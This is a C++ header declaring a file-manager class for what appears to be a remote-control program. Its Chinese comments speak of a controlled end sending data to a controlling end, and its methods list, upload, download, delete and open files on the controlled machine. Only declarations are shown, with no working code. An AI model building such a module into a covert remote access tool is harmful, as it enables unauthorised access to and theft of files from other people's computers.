// FileManager.h: interface for the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEMANAGER_H__1D0828A4_04C5_4EC1_9FC2_85E7CE293137__INCLUDED_)
#define AFX_FILEMANAGER_H__1D0828A4_04C5_4EC1_9FC2_85E7CE293137__INCLUDED_

#if _MSC_VER > 1000
#pragma once

#include "Manager.h"
#include <list>
#include <string>

using namespace std;
#endif // _MSC_VER > 1000

class CFileManager  :public CManager
{
public:
	CFileManager(CClientSocket *pClient);
	virtual ~CFileManager();
	list <string> m_UploadList;                 //由被控端向主控端发送数据的结构
	UINT m_nTransferMode;

	char m_strCurrentProcessFileName[MAX_PATH]; // 当前正在处理的文件
	__int64 m_nCurrentProcessFileLength;        // 当前正在处理的文件的长度
	UINT CFileManager::SendDriveList() ;
	void OnReceive(LPBYTE lpBuffer, UINT nSize);

	UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory);
	void CFileManager::Rename(LPBYTE lpBuffer);
	bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory);
	void CFileManager::CreateFolder(LPBYTE lpBuffer);
	bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	int CFileManager::SendToken(BYTE bToken);
	void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer);
	void CFileManager::GetFileData();
	void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	bool CFileManager::UploadToRemote(LPBYTE lpBuffer);
	bool CFileManager::FixedUploadList(LPCTSTR lpPathName);
	void CFileManager::StopTransfer();
	UINT CFileManager::SendFileSize(LPCTSTR lpszFileName);
	UINT CFileManager::SendFileData(LPBYTE lpBuffer);
	void CFileManager::UploadNext();
	void CFileManager::SetTransferMode(LPBYTE lpBuffer);
	bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd);
};

#endif // !defined(AFX_FILEMANAGER_H__1D0828A4_04C5_4EC1_9FC2_85E7CE293137__INCLUDED_)
